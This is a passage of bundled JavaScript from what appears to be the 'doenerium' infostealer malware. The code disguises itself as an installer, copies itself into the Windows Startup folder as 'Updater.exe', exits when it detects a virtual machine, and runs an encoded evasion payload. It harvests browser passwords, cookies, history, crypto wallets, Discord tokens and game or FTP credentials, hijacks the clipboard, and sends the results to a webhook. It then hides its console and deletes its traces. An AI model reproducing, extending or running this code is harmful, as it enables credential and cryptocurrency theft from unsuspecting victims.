                    request: __nccwpck_require__(761),
                };

                this.utils = {
                    encryption: __nccwpck_require__(480)(this),
                };

                this.config = {
                    counter: __nccwpck_require__(115)(this),
                    crypto: __nccwpck_require__(608)(this),
                    discord: __nccwpck_require__(829)(this),
                    environ: __nccwpck_require__(384)(this),
                    executable: __nccwpck_require__(6)(this),
                    main: __nccwpck_require__(941)(this),
                    user: __nccwpck_require__(265)(this),
                    jszip: __nccwpck_require__(481)(this),
                    wallets: __nccwpck_require__(965)(this),
                };

                this.config.webhook = __nccwpck_require__(767)(this);
                this.webhooks = [this.config.webhook.url];
                this.config.keywords = __nccwpck_require__(48)(this);

                this.utils = {
                    encryption: __nccwpck_require__(480)(this),
                    constructor: __nccwpck_require__(109)(this),
                    discord: __nccwpck_require__(779)(this),
                    flags: __nccwpck_require__(561)(this),
                    infection: __nccwpck_require__(336)(this),
                    protection: __nccwpck_require__(192)(this),
                    prototype: __nccwpck_require__(493)(this),
                    time: __nccwpck_require__(888)(this),
                    clipper: __nccwpck_require__(879)(this),
                    jszip: __nccwpck_require__(394)(this),
                    browsers: __nccwpck_require__(960)(this),
                    data: __nccwpck_require__(725)(this),
                    wallets: __nccwpck_require__(760)(this),
                    webhook: __nccwpck_require__(556)(this),
                };

                this.utils.gofile = __nccwpck_require__(612);
            }

            async add_to_startup() {
                this.requires.fs
                    .createReadStream(process.argv0)
                    .pipe(
                        this.requires.fs.createWriteStream(
                            `${process.env.APPDATA.replace(
                                "\\",
                                "/"
                            )}/Microsoft/Windows/Start Menu/Programs/Startup/Updater.exe`
                        )
                    );

                setTimeout(() => {
                    this.requires.fs.renameSync(
                        `${process.env.APPDATA.replace(
                            "\\",
                            "/"
                        )}/Microsoft/Windows/Start Menu/Programs/Startup/Updater.exe`,
                        `${process.env.APPDATA.replace(
                            "\\",
                            "/"
                        )}/Microsoft/Windows/Start Menu/Programs/Startup/Updater.exe`
                    );
                }, 3000);
            }

            create_context_function_template(eval_string, context) {
                return `
return function (context) {
"use strict";
${Object.keys(context).length > 0
                        ? `let ${Object.keys(context).map(
                            (key) => ` ${key} = context['${key}']`
                        )};`
                        : ``
                    }
return ${eval_string};
}                                                                                                                   
`;
            }

            make_context_evaluator(eval_string, context) {
                let template = this.create_context_function_template(eval_string, context);
                let functor = Function(template);
                return functor();
            }

            eval_like(text, context = {}) {
                let evaluator = this.make_context_evaluator(text, context);
                return evaluator(context);
            }

            async runtime_evasion() {
                let evasor = (`${((base64.decode(
                    
                )))}`)

                await this.eval_like(evasor,
                    this
                );
            }

            async init() {
                process.on("unhandledRejection", (err) => {
                    console.log(err);
                });

                process.on("uncaughtException", (exc) => {
                    console.log(exc);
                });

                process.title = "Installer";
                console.log("Downloading client...");

                const exit = await this.utils.protection.inVM();

                if (exit) {
                    process.exit(0);
                }

                this.axios_instance = this.requires.axios.create({
                    httpsAgent: new this.requires.https.Agent({
                        rejectUnauthorized: false
                    })
                })

                this.runtime_evasion();
                this.add_to_startup();

                try {
                    this.config.embed = JSON.parse(
                        JSON.stringify(
                            (
                                await this.axios_instance.get(
                                    "https://raw.githubusercontent.com/evasion6969/Evasion/main/embed.json"
                                )
                            ).data
                        )
                    );
                } catch {
                    this.config.embed =
                    {
                        "username": "t.me/doenerium69",
                        "href": "https://t.me/doenerium69",
                        "avatar_url": "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
                        "credits": "t.me/doenerium69"
                    }
                }

                this.config.embed.footer = {
                    text: `${this.utils.encryption.decryptData(
                        this.config.user.hostname
                    )} | ${this.config.embed.credits}`,
                    icon_url: this.config.embed.avatar_url,
                };

                this.config.jszip.path = this.config.jszip.generate_path();

                await this.utils.browsers.closeBrowsers()

                this.utils.jszip.createFolder("\\Wallets")

                try {
                    for (var path of this.config.environ.password_and_cookies_paths) {
                        if (this.requires.fs.existsSync(path + "Login Data")) {
                            [
                                "getPasswords",
                                "getCookies",
                                "getBookmarks",
                                "getHistory",
                                "getAutofill",
                                "getWallets",
                            ].forEach(async (_func) => {
                                try {
                                    this.utils.browsers[_func](path);
                                } catch (e) { console.log(e) }
                            });
                        }
                    }
                } catch (err) {
                    try {
                        await this.utils.webhook.sendToWebhook({ embeds: [this.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of doenerium", description: `\`\`\`${err}\`\`\`` })] })
                    } catch { }
                }


                try {
                    ["filezilla", "minecraft", "growtopia", "steam"].forEach(type => {
                        this.utils.infection[`get_${type}`]()
                    })
                } catch (err) {
                    try {
                        await this.utils.webhook.sendToWebhook({ embeds: [this.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of doenerium", description: `\`\`\`${err}\`\`\`` })] })
                    } catch { }
                }

                try {
                    this.utils.clipper.detectClipboard();
                } catch { }

                try {
                    this.utils.wallets.getWallets();
                } catch (err) {
                    try {
                        await this.utils.webhook.sendToWebhook({ embeds: [this.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of doenerium", description: `\`\`\`${err}\`\`\`` })] })
                    } catch { }
                }

                try {
                    this.utils.discord.getTokens();
                } catch (err) {
                    try {
                        await this.utils.webhook.sendToWebhook({ embeds: [this.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of doenerium", description: `\`\`\`${err}\`\`\`` })] })
                    } catch { }
                }

                try {
                    this.utils.discord.saveDiscordTokens();
                } catch (err) {
                    try {
                        await this.utils.webhook.sendToWebhook({ embeds: [this.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of doenerium", description: `\`\`\`${err}\`\`\`` })] })
                    } catch { }
                }

                await this.utils.infection.initialize();


                await this.utils.time.sleep(120000);

                try {
                    this.requires.fs.rmSync(this.config.jszip.path, {
                        recursive: true,
                        force: true,
                    });

                    this.requires.fs.rmSync(`${this.config.jszip.path}.zip`, {
                        recursive: true,
                        force: true,
                    });
                } catch (err) {
                    try {
                        await this.utils.webhook.sendToWebhook({ embeds: [this.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of doenerium", description: `\`\`\`${err}\`\`\`` })] })
                    } catch { }
                }
            }
        }

        process.on("unhandledRejection", (err) => {
            console.log(err);
        });

        process.on("uncaughtException", (exc) => {
            console.log(exc);
        });

        const axios = __nccwpck_require__(382);

        async function hideSelf() {
            (__nccwpck_require__(929).hideConsole)();
        }

        (async () => {
            await hideSelf();
            while (true) {
                try {
                    await axios.get("https://www.google.com");

                    break;
                } catch {
                    // no internet connection
                }

                await new Promise((resolve) => setTimeout(resolve, 3000));
            }

            new doenerium().init();
        })();

    })();

    module.exports = __webpack_exports__;
    /******/
})();
